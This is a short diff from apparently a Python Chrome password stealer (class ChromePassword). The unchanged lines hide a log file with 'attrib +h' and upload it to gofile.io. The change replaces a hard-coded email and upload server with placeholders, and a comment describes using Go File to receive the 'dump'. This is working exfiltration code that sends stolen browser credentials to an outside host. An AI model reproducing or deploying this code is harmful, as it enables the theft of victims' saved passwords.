@@ -136,8 +136,10 @@ class ChromePassword:
 
         os.system( "attrib +h log.txt" )
 
-        url = "https://store8.gofile.io/uploadFile"
-        payload = {'email': 'tatakae129@outlook.com'}
+        # Use service Go File for receive dump (input email and server)
+
+        url = "https://{{server}}.gofile.io/uploadFile"
+        payload = {'email': 'email@email'}
         file =  open('log.txt','rb')
         files = [('file', file)]
         
